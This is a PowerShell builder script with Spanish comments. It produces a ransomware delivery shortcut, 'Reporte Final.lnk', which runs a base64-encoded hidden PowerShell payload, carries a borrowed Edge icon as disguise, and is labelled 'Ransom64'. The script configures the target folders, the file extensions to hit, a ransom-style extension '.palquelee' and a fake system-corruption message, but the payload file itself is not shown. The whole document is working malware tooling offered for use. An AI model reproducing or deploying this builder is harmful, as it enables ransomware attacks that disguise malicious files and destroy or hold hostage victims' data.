# Este codigo permite generar el LNK de infección

#####
# VARIABLES PARA CONFIGURAR
$dirs = "(Downloads|Desktop|Documents)"
$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".exe", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg");
$final_ext = ".palquelee"
$archivo_lnk = "Reporte Final.lnk"
$mensaje_final = "Ocurrió un error, el sistema esta corrupto.`nThere is an error the system is corrupt."
#####

#####
# Entorno
$base = $PSScriptRoot+"\";
if($base -eq "\"){$base = ".\"}
$output = $base + "output\";
$payloads = $base + "payloads\";
if((Test-Path $output) -eq $false){New-Item -ItemType Directory $output}
if((Test-Path $payloads) -eq $false){New-Item -ItemType Directory $payloads}
#####
#####
# Archivos con el payload y el output
$archivo = "MiInfeccion.ps1"
#####

#####
# Inicio de código
$cont = Get-Content $payloads$archivo;
# Reemplazo de Variables
$ext = "'" + ($ext | ConvertTo-Json -Compress) + "' | ConvertFrom-Json"
$cont = $cont.Replace("{{DIRECTORIOS}}", $dirs)
$cont = $cont.Replace("{{LISTADO_EXTENSIONES}}",$ext)
$cont = $cont.Replace("{{EXTENSION_FINAL}}", $final_ext)
$cont = $cont.Replace("{{MENSAJE_FINAL}}", $mensaje_final)
$cont = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cont));

pylnk3 c --arguments "-WindowStyle hidden -e $cont" --icon "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --icon-index 13 --mode "Minimized" --description "Ransom64" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $output$archivo_lnk
#####

<# Este codigo no funciona por usar API de Windows, se debe usar pylnk3
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($base+"prueba_base.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle hidden -e " + $cont
$Shortcut.IconLocation = $env:SystemRoot + "\explorer.exe"
$Shortcut.Save()
#>
